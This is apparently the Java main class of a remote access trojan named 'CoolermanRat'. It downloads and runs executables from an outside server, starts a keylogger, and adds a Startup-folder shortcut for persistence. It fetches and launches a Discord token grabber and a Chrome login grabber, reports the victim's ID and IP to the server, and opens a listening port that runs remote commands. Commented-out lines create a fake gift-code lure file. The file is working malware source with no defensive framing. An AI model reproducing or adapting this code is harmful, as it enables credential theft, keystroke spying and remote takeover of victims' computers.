package me.dodeedoo.CoolermanRat;

import mslinks.ShellLink;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class Main {

    public static String version = "1.0";
    public static String uuid;
    public static String ip;
    public static Boolean debug = true;
    public static KeyLogger keyLogger = new KeyLogger();
    public static String userdir = System.getProperty("user.home");
    private static List<String> versions = new ArrayList<>();

    public static void downloadFile(URL url, String outputFileName) throws IOException {
        File file = new File(outputFileName);
        file.getParentFile().mkdir();
        try (InputStream in = url.openStream();
             ReadableByteChannel rbc = Channels.newChannel(in);
             FileOutputStream fos = new FileOutputStream(outputFileName)) {
            fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
        }

    }

    public static String versionCheck(String url) throws IOException {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", "Mozilla/5.0");
        int responseCode = con.getResponseCode();
        System.out.println("\nGetting version : " + url);
        System.out.println("Response Code : " + responseCode);
        if (responseCode != 200) {
            System.out.println("error occured while getting version...");
            return version;
        }
        BufferedReader in = new BufferedReader(
                new InputStreamReader(con.getInputStream()));
        String inputLine;
        StringBuffer response = new StringBuffer();
        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();
        return response.toString();
    }


    public static void main(String[] args) throws Exception {

        File uuidfile = new File(userdir + "/din32key.txt");
        if (!uuidfile.exists()) {
            uuidfile.createNewFile();
            FileWriter writer = new FileWriter(userdir + "/din32key.txt");
            uuid = UUID.randomUUID().toString();
            writer.write(uuid);
            writer.close();
        }else{
            BufferedReader reader = new BufferedReader(new FileReader(userdir + "/din32key.txt"));
            uuid = reader.readLine();
        }

        try(final DatagramSocket socket = new DatagramSocket()){
            socket.connect(InetAddress.getByName("8.8.8.8"), 10002);
            ip = socket.getLocalAddress().getHostAddress();
        }catch (Exception e) {
            System.exit(3);
        }

        if (!version.equals(versionCheck("http://a6tj7d.xyz/ul/main/ver").replace("\"", "").replace("}", "").replace("{", "").replace(":", "").replace("version", ""))) {
            System.out.println(versionCheck("http://a6tj7d.xyz/ul/main/ver").replace("\"", "").replace("}", "").replace("{", "").replace(":", "").replace("version", ""));
            downloadFile(new URL("http://a6tj7d.xyz/ul/main/dl"), userdir + "/din32/cache/din32.exe");
            Runtime.getRuntime().exec(userdir + "\\din32\\cache\\din32.exe", null, new File(userdir + "\\din32\\cache\\"));
            System.exit(2);
        }

        if (debug) {
            JFrame frame = new JFrame();
            frame.add(new JLabel("Console Log"), BorderLayout.NORTH);
            JTextArea ta = new JTextArea();
            TextAreaOutputStream taos = new TextAreaOutputStream(ta, 60);
            PrintStream ps = new PrintStream(taos);
            System.setOut(ps);
            System.setErr(ps);
            frame.add(new JScrollPane(ta));
            frame.pack();
            frame.setVisible(true);
            frame.setSize(800, 600);
            frame.setIconImage(ImageIO.read(new URL("https://dodeedoo.me/server-icon.png")));
        }

        //new CMDManager(new String[]{"ipconfig"}, "IP");
        //new CMDManager(new String[]{"cmd", "/c", "dir", "C:\\Program Files"}, "");
        //new CMDManager(new String[]{"cmd", "/c", "ver"}, "");
        //new CMDManager(new String[]{"cmd", "/c", "arp", "-a"}, "");

        downloadFile(new URL("http://a6tj7d.xyz/ul/main/dl"), userdir + "/din32/din32.exe");
        //File dummyfile = new File(userdir + "/list.txt");
        //dummyfile.createNewFile();
        //FileWriter dummyfilewriter = new FileWriter(userdir + "/list.txt");
        //dummyfilewriter.write("STEAM GIFT CODES / AMAZON GIFT CODES \n a32rm1zpl00d steam 20$ \n n0hpl7dhp7a amazon 15$ \n ft4b6m2b2 steam 40$ \nGENERATED BY WARHOGS GIFT GEN");
        //dummyfilewriter.close();
        //Desktop.getDesktop().open(dummyfile);
        keyLogger.init();

        try {
            ShellLink.createLink(userdir + "/din32/din32.exe", userdir + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/runtimestartup.lnk");
        }catch (IOException e) {
            e.printStackTrace();
        }

        downloadFile(new URL("http://a6tj7d.xyz/ul/tokengrabber/dl"), userdir + "/din32/din32util.exe"); //discord grabber
        Runtime.getRuntime().exec(userdir + "\\din32\\din32util.exe", null, new File(userdir + "\\din32\\"));
        downloadFile(new URL("http://a6tj7d.xyz/ul/logingrabber/dl"), userdir + "/din32/dinlib.exe"); //chrome grabber
        Runtime.getRuntime().exec(userdir + "\\din32\\dinlib.exe", null, new File(userdir + "\\din32\\"));

        ServerSocket serverSocket = new ServerSocket(44213);

        while (true) {
            new Requests("http://a6tj7d.xyz/sendupdate", "{\"uuid\":\"" + uuid + "\",\"ip\":\""+ip+"\"}").execute();
            Socket clientSocket = serverSocket.accept();
            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            String inputLine;
            if (in.readLine().equals("kill")) {
                break;
            }
            while ((inputLine = in.readLine()) != null) {
                if (inputLine.contains("cmd")) {
                    inputLine = inputLine.replace("cmd ", "");
                    String[] commands = inputLine.split(" ");
                    new CMDManager(commands, "");
                    break;
                }
            }
        }
    }
}
